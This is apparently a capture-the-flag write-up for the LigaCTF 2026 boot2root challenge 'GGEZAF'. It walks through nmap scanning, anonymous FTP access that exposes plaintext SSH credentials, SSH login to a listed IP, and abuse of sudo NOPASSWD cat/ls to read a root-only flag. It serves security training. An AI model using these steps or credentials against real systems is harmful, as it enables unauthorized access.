---
title: "GGEZAF"
summary: "LigaCTF 2026 ligactf2026, forensics, boot2root writeup covering GGEZAF with analysis, solution steps, and final recovery notes."
date: 2026-05-31
tags:
  - ctf
  - ligactf2026
  - forensics
  - boot2root
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Information

| Field | Details |
|---|---|
| Challenge | GGEZAF |
| Category | Boot2Root |
| Points | 473 |
| Target IP | `45.32.121.222` |
| Flag Format | `OWASPKL{...}` |

## Objective

Gain initial access to the dockerized target, enumerate the system, identify a privilege escalation path, and retrieve the root flag.

## Reconnaissance

Initial port scan:

```bash
nmap 45.32.121.222
````

Result:

![pasted-image-20260601012622](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012622.png)

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Service/version scan:

```bash
nmap -sV -sC 45.32.121.222
```

Important findings:

![pasted-image-20260601012637](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012637.png)

```text
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r-- 1 ftp ftp 19 May 29 13:06 creds.txt

22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.2
```

FTP allowed anonymous login and exposed a file named `creds.txt`.

## FTP Enumeration

Connected to FTP:

```bash
ftp 45.32.121.222
```

Logged in anonymously:

![pasted-image-20260601012655](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012655.png)

```text
Name: Anonymous
Password: [REDACTED_PASSWORD]
```

Listed files:

```bash
ls -la
```

Output:

```text
-rw-r--r-- 1 ftp ftp 19 May 29 13:06 creds.txt
```

Downloaded the credential file:

```bash
get creds.txt
```

![pasted-image-20260601012717](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012717.png)

Read the file locally:

```bash
cat creds.txt
```

Credentials found:

![pasted-image-20260601012731](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012731.png)

```text
user1337:notsoleet
```

## Initial Access

Used the discovered credentials to SSH into the target:

```bash
ssh user1337@45.32.121.222
```

Password:

```text
notsoleet
```

Successful login:

```text
Welcome to Ubuntu 26.04 LTS
user1337@docker-chall-1:~$
```

![pasted-image-20260601012752](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012752.png)
## Local Enumeration

Listed the user home directory:

```bash
ls -la
```

Interesting files:

```text
-rwxrwxrwx 1 user1337 user1337 32 May 29 13:07 info.txt
-rwxrwxr-x 1 user1337 user1337 732 May 30 13:25 test.py
```

Read `info.txt`:

```bash
cat info.txt
```

Output:

```text
privesc to root to get flag. TY
```

Checked sudo privileges:

```bash
sudo -l
```

Output:

```text
User user1337 may run the following commands on docker-chall-1:
    (ALL) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

![pasted-image-20260601012814](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012814.png)

This showed that `user1337` could execute `/usr/bin/cat` and `/usr/bin/ls` as root without a password.

## Privilege Escalation

The sudo permission did not grant a root shell, but it allowed root-level file listing and file reading.

Listed the `/root` directory:

```bash
sudo /usr/bin/ls -la /root
```

Output:

```text
total 32
drwx------ 1 root root 4096 May 29 13:10 .
drwxr-xr-x 1 root root 4096 May 29 17:14 ..
-rw------- 1 root root 1423 May 29 13:10 .bash_history
-rw-r--r-- 1 root root 3106 Apr 20 16:46 .bashrc
drwxr-xr-x 3 root root 4096 May 29 13:06 .local
-rw-r--r-- 1 root root 132 Apr 20 16:46 .profile
drwx------ 2 root root 4096 May 29 13:03 .ssh
-r-------- 1 root root 47 May 29 13:08 [REDACTED_ROOT_FILE]
```

The root flag file was readable only by root:

```text
-r-------- 1 root root 47 May 29 13:08 [REDACTED_ROOT_FILE]
```

Used the sudo-allowed `cat` binary to read it:

```bash
sudo /usr/bin/cat /root/[REDACTED_ROOT_FILE]
```

![pasted-image-20260601012829](/images/writeups/local-ctf/ligactf2026/ggezaf/pasted-image-20260601012829.png)
## Root Flag

```text
OWASPKL{H3re's_th3_G1v3aW4y_500_p0int5_f0r_yA}
```

## Vulnerability Summary

|Stage|Finding|Impact|
|---|---|---|
|FTP Enumeration|Anonymous FTP login enabled|Exposed credential file|
|Credential Disclosure|`creds.txt` contained SSH credentials|Allowed initial SSH access|
|Sudo Misconfiguration|`user1337` could run `/usr/bin/cat` and `/usr/bin/ls` as root|Allowed reading root-only files|

## Attack Chain

```text
Open FTP
  ↓
Anonymous login
  ↓
Download creds.txt
  ↓
SSH as user1337
  ↓
Check sudo privileges
  ↓
Abuse sudo NOPASSWD cat/ls
  ↓
Read /root/[REDACTED_ROOT_FILE]
  ↓
Root flag obtained
```
